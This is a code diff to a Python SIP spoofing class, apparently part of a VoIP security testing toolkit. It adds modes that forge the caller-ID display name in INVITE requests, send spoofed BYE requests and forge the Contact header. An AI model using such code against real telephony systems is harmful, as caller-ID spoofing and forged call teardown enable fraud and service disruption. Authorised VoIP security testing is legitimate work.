@@ -15,14 +15,15 @@ class spooferUser(User):
 	def __init__(self, app):
 		User.__init__(self,app)
         #Spoofer options
-		self.spoof_method = app.options.spoof_method
 		self.spoof_mode = app.options.spoof_mode
 		self.spoof_name = app.options.spoof_name
 		self.spoof_msg_file = app.options.spoof_msg_file
+		self.spoof_contact = app.options.spoof_contact
         #Spoofer sets
 		self._spooferGen = None
         #Listener
-		self.listenerOff = True if self.spoof_mode == 'callerID' else False
+		self.listenerOff = True if self.spoof_mode == 'spfINVITE' else False
+		self.spoof_method = {'spfINVITE':'INVITE','spfBYE':'BYE'}[app.options.spoof_mode]
 	
 	def stop(self):
 		if self._listenerGen:
@@ -42,7 +43,7 @@ class spooferUser(User):
 		return self
 	
 	def _spoofing(self):
-		# Msg to flood generator ---------
+		# Msg to spoof generator ---------
 		def _createSpoofMessage():
 			if self.spoof_msg_file:
 				with open (self.spoof_msg_file, "r") as file_txt:
@@ -52,27 +53,24 @@ class spooferUser(User):
 					m = m._parse(file_txt.rstrip()+'\r\n\r\n\r\n')
 				except ValueError, E: pass # TODO: send 400 response to non-ACK request
 			else:
-				m = self._ua.createRequest(self.flood_method)
+				m = self._ua.createRequest(self.spoof_method)
 				m.Contact = rfc3261.Header(str(self._stack.uri), 'Contact')
 				m.Contact.value.uri.user = self.localParty.uri.user
 				m.Expires = rfc3261.Header(str(self.app.options.register_interval), 'Expires')
 			return m
 		# Spoof msg content ---------
 		def spoofMsg(message):
-			if self.spoof_mode == 'callerID':
+			if self.spoof_mode == 'spfINVITE':
 				message.From.value.displayName = self.spoof_name
+			if self.spoof_contact:
+				message.Contact = rfc3261.Header(str(self.spoof_contact), 'Contact')
 			return message
 		# Stop listener if not necessary in spoof mode
 		if self.listenerOff: self._listenerGen.close()
 		try:
-			# message = spoofMsg(self._ua.createRequest(self.spoof_method))
-			message = _createSpoofMessage()
-			# Send raw
-			print message
-			self.send(str(message),self.remoteParty.uri.hostPort,None)
-			# Send w/transaction
-			# self._ua.sendRequest(message)
+			spoof_message = spoofMsg(_createSpoofMessage())
 			if not self.listenerOff:
+				self._ua.sendRequest(spoof_message)
 				while True:
 					response = (yield self._ua.queue.get())
 					if response.CSeq.method == 'REGISTER':
@@ -85,6 +83,8 @@ class spooferUser(User):
 							raise StopIteration(('success', None))
 						elif response.isfinal: # failed
 							raise StopIteration(('failed', str(response.response) + ' ' + response.responsetext))
+			else:
+				self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)				
 			yield multitask.sleep(1)
 			self.app.stop()
 			yield
